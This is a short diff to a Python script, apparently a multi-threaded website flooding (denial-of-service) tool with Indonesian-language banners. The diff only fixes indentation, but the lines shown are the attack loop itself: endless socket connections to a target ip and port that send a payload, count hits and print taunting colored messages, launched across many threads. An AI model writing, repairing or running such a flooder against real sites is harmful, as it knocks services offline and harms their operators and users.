@@ -80,13 +80,13 @@ def start():
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-         s.connect((ip,port))
-         s.send(r)
-         u += 1
-         print("\033[33m[\033[1m+\033[33m]\033[92m0ps BADAI GURUN   " +str(u)+ "  \033[33mZN33P3R 6453 " +str()+ "   \033[97m" +ip+ "\033[0m" )
+            s.connect((ip,port))
+            s.send(r)
+            u += 1
+            print("\033[33m[\033[1m+\033[33m]\033[92m0ps BADAI GURUN   " +str(u)+ "  \033[33mZN33P3R 6453 " +str()+ "   \033[97m" +ip+ "\033[0m" )
        finally:
-         s.close()
-         print("\033[33m[\033[1m-\033[33m]\033[92mSitus Done!")
+            s.close()
+            print("\033[33m[\033[1m-\033[33m]\033[92mSitus Done!")
 
 for x in range(thread):
   thred = threading.Thread(target=start)
